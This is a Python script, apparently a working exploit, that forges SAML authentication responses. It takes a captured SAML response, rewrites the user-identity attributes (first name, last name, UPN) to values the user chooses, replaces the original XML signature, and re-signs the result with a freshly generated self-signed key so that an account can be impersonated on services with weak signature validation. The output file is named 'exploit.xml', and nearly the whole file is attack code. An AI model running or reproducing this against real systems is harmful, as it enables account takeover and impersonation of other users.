import xml.etree.ElementTree as ET
import sys
import subprocess
import os

def read_xml_file(file_path):
    # Parse the XML file
    tree = ET.parse(file_path)
    root = tree.getroot()
    
    return tree

def replace_values(root, username, email):
    ns = {
        'samlp': 'urn:oasis:names:tc:SAML:2.0:protocol',
        'saml': 'urn:oasis:names:tc:SAML:2.0:assertion',
        'xsi': 'http://www.w3.org/2001/XMLSchema-instance',
        'xs': 'http://www.w3.org/2001/XMLSchema'
    }
    
    for attribute in root.findall('.//saml:Attribute', ns):
        name_attr = attribute.get('Name')
        if name_attr == "FirstName":
            for value in attribute.findall('.//saml:AttributeValue', ns):
                value.text = username
        elif name_attr == "LastName" or name_attr == "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn":
            for value in attribute.findall('.//saml:AttributeValue', ns):
                value.text = email

def replace_signature_with_new_block(root):
    ns = {
        'saml': 'urn:oasis:names:tc:SAML:2.0:assertion',
        'ds': 'http://www.w3.org/2000/09/xmldsig#'
    }

    new_signature = ET.Element('Signature', xmlns="http://www.w3.org/2000/09/xmldsig#")
    signed_info = ET.SubElement(new_signature, 'SignedInfo')
    canonicalization_method = ET.SubElement(signed_info, 'CanonicalizationMethod', Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#")
    signature_method = ET.SubElement(signed_info, 'SignatureMethod', Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1")
    reference = ET.SubElement(signed_info, 'Reference')
    transforms = ET.SubElement(reference, 'Transforms')
    transform_1 = ET.SubElement(transforms, 'Transform', Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature")
    transform_2 = ET.SubElement(transforms, 'Transform', Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#")
    digest_method = ET.SubElement(reference, 'DigestMethod', Algorithm="http://www.w3.org/2000/09/xmldsig#sha1")
    digest_value = ET.SubElement(reference, 'DigestValue')
    signature_value = ET.SubElement(new_signature, 'SignatureValue')
    key_info = ET.SubElement(new_signature, 'KeyInfo')
    key_value = ET.SubElement(key_info, 'KeyValue')

    for assertion in root.findall('.//saml:Assertion', ns):
        signature = assertion.find('.//ds:Signature', ns)
        if signature is not None:
            parent_index = list(assertion).index(signature)
            assertion.remove(signature)
            
            # Insert the new signature block in the position of the removed signature
            assertion.insert(parent_index, new_signature)

def write_xml_file(tree, output_path):
    # Write the XML to a file with namespaces preserved
    root = tree.getroot()
    ET.register_namespace('samlp', 'urn:oasis:names:tc:SAML:2.0:protocol')
    ET.register_namespace('saml', 'urn:oasis:names:tc:SAML:2.0:assertion')
    ET.register_namespace('ds', 'http://www.w3.org/2000/09/xmldsig#')
    ET.register_namespace('xsi', 'http://www.w3.org/2001/XMLSchema-instance')
    ET.register_namespace('xs', 'http://www.w3.org/2001/XMLSchema')

    tree.write(output_path, encoding='unicode', xml_declaration=True)

def main():
    if len(sys.argv) != 2:
        print("Usage: python script.py <input_file_path>")
        sys.exit(1)
    
    input_file_path = sys.argv[1]
    output_file_path = 'exploit.xml'
    placeholder_file_path = 'placeholder.xml'
    
    # Read the XML file
    tree = read_xml_file(input_file_path)
    
    # Ask for user input
    email = input("Please enter your email: ")
    username = input("Please enter your username: ")
    
    # Replace values in the XML tree
    root = tree.getroot()
    replace_values(root, username, email)
    
    # Replace the Signature block with a new one
    replace_signature_with_new_block(root)
    
    # Write the updated XML tree to another file
    write_xml_file(tree, placeholder_file_path)
    
    # Run the openssl command to generate the key and certificate
    openssl_command = [
        'openssl', 'req', '-x509', '-newkey', 'rsa:2048', '-keyout', 'key.pem', 
        '-out', 'cert.pem', '-days', '1000', '-nodes', '-subj', '/CN=example.com'
    ]
    result = subprocess.run(openssl_command)
    
    if result.returncode != 0:
        print("Failed to generate key and certificate.")
        sys.exit(1)
    
    # Run the xmlsec1 command to sign the XML
    xmlsec_command = 'xmlsec1 --sign --privkey-pem key.pem %s > %s' % (placeholder_file_path, output_file_path)
    result = subprocess.run(xmlsec_command, shell=True)
    
    if result.returncode == 0:
        print(f"Successfully signed the XML. Output saved to exploit-signed.xml")
    else:
        print("Failed to sign the XML.")

    # Clean up the temporary files
    os.remove('key.pem')
    os.remove('cert.pem')
    os.remove(placeholder_file_path)

if __name__ == "__main__":
    main()
